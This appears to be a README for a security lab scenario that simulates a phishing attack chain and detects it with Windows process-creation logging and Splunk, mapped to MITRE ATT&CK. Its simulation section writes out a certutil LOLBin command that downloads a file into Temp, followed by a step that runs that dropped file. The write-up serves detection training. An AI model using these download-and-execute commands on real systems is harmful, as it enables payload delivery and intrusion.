# Scenario 05 — Phishing Attack Detection

## 🎯 Objective
Simulate and detect a phishing-driven attack chain — from malicious attachment execution through Living-off-the-Land Binary (LOLBin) payload download — using native Windows Event Logging and Splunk.

## 🧩 MITRE ATT&CK Mapping
| Technique | ID |
|---|---|
| Phishing: Spearphishing Attachment | T1566.001 |
| User Execution: Malicious File | T1204.002 |
| Ingress Tool Transfer | T1105 |

## 🖥️ Attack Simulation

**1. Simulated macro trigger (Office document execution)**
```cmd
cmd.exe /c echo Simulating WINWORD.EXE
```

**2. Simulated payload download via certutil (LOLBin abuse)**
```cmd
certutil.exe -urlcache -split -f https://raw.githubusercontent.com C:\Users\hp\AppData\Local\Temp\update.exe
```

**3. Simulated dropped payload execution**
```cmd
cmd.exe /c echo Payload executed > %TEMP%\update.exe
%TEMP%\update.exe
```

## 🔍 Detection Queries
See [`Scenario_05_Phishing_Attack.spl`](../../SPL-Queries/Scenario_05_Phishing_Attack.spl) for the full query set, including:
- Baseline 4688 logging check
- Macro-trigger detection
- certutil LOLBin download detection
- Payload execution detection
- Combined attack-chain timeline query
- Generalized production-equivalent detection logic (Office→script spawn, encoded PowerShell, Temp execution)

## 📊 Key Findings
| Time | Event | Technique |
|---|---|---|
| 19:20:26 | Simulated macro trigger | T1566.001 / T1204.002 |
| 19:21:14 / 19:24:48 | Simulated payload execution attempts | T1204.002 |
| 19:30:03 | certutil LOLBin payload download | T1105 |

**Detection gap noted:** dropped payload (`update.exe`) did not generate an independent execution event, since the simulated file was a non-functional placeholder rather than a real binary. Documented as a simulation limitation, not a logic failure.

## 📸 Screenshots
| File | Description |
|---|---|
| `screenshots/scenario05_01_macro_and_payload_execution.png` | Macro trigger + payload execution attempts |
| `screenshots/scenario05_02_certutil_download.png` | certutil LOLBin payload download (T1105) |
| `screenshots/scenario05_03_combined_attack_chain.png` | Full combined attack-chain query result |

## 🟠 Verdict
Confirmed simulated phishing execution chain — successfully detected using native Windows Event ID 4688 logging, with certutil LOLBin abuse as the highest-confidence indicator.

## 📁 Related Files
- Full investigation report: [`Investigation-Reports/Scenario_05_Phishing_Attack.md`](../../Investigation-Reports/Scenario_05_Phishing_Attack.md)
- Formal incident report: [`Incident-Reports/IR-2026-006_Phishing_Attack.docx`](../../Incident-Reports/IR-2026-006_Phishing_Attack.docx)
- SPL queries: [`SPL-Queries/Scenario_05_Phishing_Attack.spl`](../../SPL-Queries/Scenario_05_Phishing_Attack.spl)
